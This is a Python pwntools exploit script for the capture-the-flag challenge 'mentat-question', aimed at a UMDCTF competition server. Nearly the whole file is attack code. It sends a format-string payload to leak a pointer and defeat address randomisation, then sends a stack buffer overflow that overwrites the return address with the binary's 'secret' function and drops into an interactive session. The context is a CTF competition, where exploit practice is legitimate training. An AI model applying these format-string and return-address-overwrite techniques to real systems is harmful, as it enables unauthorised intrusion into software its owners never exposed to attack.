#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' mentat-question
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'mentat-question')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
# challs.umdctf.io 32300
host = args.HOST or 'challs.umdctf.io'
port = int(args.PORT or 32300)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b calculate
b *calculate+199
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
def divide(num1,num2):
    prompt = b"Which numbers would you like divided?"
    io.recvuntil(prompt)

    io.sendline(num1)
    io.sendline(num2)
    io.sendline()

io = start()
io.sendlineafter(b"What would you like today?", b"Division")

divide(b"1",b"2")
divide(b"",b"")

p = b"Yes"
p+= b"%p"
io.sendlineafter(b"Would you like to try again?", p)

recv = io.recvuntil(b"heard?")
leak = int(recv.split(b"Was that a Yes")[1][:14], 16)-0x206d
exe.address = leak
log.success(hex(leak))


divide(b"",b"")
p = b"Yes"
p+=cyclic(21)
p+=p64(exe.sym['secret']+1)
io.sendlineafter(b"Would you like to try again?", p)
io.interactive()

